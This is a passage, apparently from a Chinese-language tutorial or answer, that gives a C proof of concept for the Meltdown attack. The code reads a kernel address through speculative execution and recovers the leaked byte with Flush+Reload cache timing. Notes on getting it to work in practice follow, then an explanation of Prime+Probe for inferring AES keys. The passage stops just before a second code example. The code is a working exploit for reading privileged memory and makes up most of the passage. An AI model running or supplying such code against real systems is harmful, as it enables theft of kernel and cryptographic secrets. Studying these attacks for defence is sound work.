#include <stdio.h>
#include <stdint.h>
#include <signal.h>
#include <setjmp.h>
#include <x86intrin.h>

#define CACHE_HIT_THRESHOLD 100
#define PROBE_SIZE 256

static jmp_buf jmpbuf;
static void segfault_handler(int sig) {
    longjmp(jmpbuf, 1);
}

// 探测数组，每个元素间隔4096字节避免缓存行冲突
uint8_t probe[PROBE_SIZE * 4096];

// 尝试读取内核地址并触发缓存
void meltdown_read(uint64_t kernel_addr) {
    // 设置信号处理
    signal(SIGSEGV, segfault_handler);
    if (setjmp(jmpbuf) == 0) {
        // 尝试读取内核地址（会触发异常）
        volatile uint8_t *ptr = (volatile uint8_t *)kernel_addr;
        uint8_t value = *ptr;
        // 投机执行：使用value作为索引访问probe
        volatile uint8_t temp = probe[value * 4096];
        (void)temp;
    }
    // 恢复信号处理
    signal(SIGSEGV, SIG_DFL);
}

// 测量probe中某个索引的访问时间
uint64_t probe_time(int index) {
    uint64_t start, end;
    unsigned int aux;
    start = __rdtscp(&aux);
    volatile uint8_t temp = probe[index * 4096];
    end = __rdtscp(&aux);
    return end - start;
}

int main() {
    // 清空缓存（Flush probe数组）
    for (int i = 0; i < PROBE_SIZE; i++) {
        _mm_clflush(&probe[i * 4096]);
    }
    _mm_mfence();

    // 选择要读取的内核地址（例如内核代码段的一个字节）
    uint64_t target_addr = 0xffffffff81000000;  // 示例地址，实际需根据系统调整

    // 执行Meltdown读取
    meltdown_read(target_addr);

    // 检测哪个索引被缓存
    int leaked_byte = -1;
    for (int i = 0; i < PROBE_SIZE; i++) {
        uint64_t t = probe_time(i);
        if (t < CACHE_HIT_THRESHOLD) {
            leaked_byte = i;
            break;
        }
    }

    if (leaked_byte != -1) {
        printf("Leaked byte at 0x%lx: %d (0x%x)\n", target_addr, leaked_byte, leaked_byte);
    } else {
        printf("No leak detected\n");
    }

    return 0;
}


**注意事项**：
- 实际利用需要多次测量以消除噪声，并处理缓存行对齐问题。
- 内核地址需根据系统内存布局确定，通常需要先泄露内核基址。
- 现代系统已默认启用KPTI，此POC在未打补丁的旧系统上才有效。
- 代码中使用了`setjmp`/`longjmp`捕获异常，但实际中异常处理可能影响缓存状态，更精细的方法使用信号处理或`try`/`catch`（C++）。

**Prime+Probe**是一种缓存侧信道攻击技术，与Flush+Reload不同，它不需要共享内存，而是通过监控受害者对特定缓存集的访问来推断信息。其原理分为三步：
1. **Prime**：攻击者填充目标缓存集（例如L1数据缓存的某个组），使其所有缓存行都被攻击者的数据占据。
2. **等待**：攻击者等待受害者执行，受害者可能会访问其自己的数据，从而驱逐攻击者的一些缓存行。
3. **Probe**：攻击者重新加载之前填充的缓存行，测量加载时间。如果某个缓存行被驱逐（加载时间变长），说明受害者访问了同一个缓存集，从而泄露了受害者的内存访问模式。

Prime+Probe常用于监控加密算法中的查找表访问，例如AES的T-table，通过观察哪些缓存集被访问，可以推断密钥。

以下是一个C代码示例，演示如何监控一个简单函数对特定内存地址的访问（假设攻击者和受害者运行在同一物理核心上，且共享L1缓存）。

